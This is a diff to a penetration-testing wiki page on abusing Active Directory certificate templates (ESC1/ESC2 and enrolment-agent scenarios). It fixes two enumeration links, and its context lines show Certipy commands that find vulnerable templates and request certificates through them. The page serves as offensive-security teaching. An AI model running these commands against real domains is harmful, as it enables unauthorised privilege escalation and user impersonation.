@@ -83,7 +83,7 @@ When a certificate template allows to specify a `subjectAltName`, it is possible
 {% tab title="UNIX-like" %}
 From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC1 and ESC2 scenarios.&#x20;
 
-Once a vulnerable template is found ([how to enumerate](broken-reference)), a request shall be made to obtain a certificate.
+Once a vulnerable template is found ([how to enumerate](./#attack-paths)), a request shall be made to obtain a certificate.
 
 ```bash
 #To specify a user account in the SAN
@@ -141,7 +141,7 @@ From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can 
 certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -vulnerable
 ```
 
-Once a vulnerable template is found ([how to enumerate](broken-reference)), a request shall be made to obtain a certificate specifying the **Certificate Request Agent** EKU.
+Once a vulnerable template is found ([how to enumerate](./#attack-paths)), a request shall be made to obtain a certificate specifying the **Certificate Request Agent** EKU.
 
 ```bash
 certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
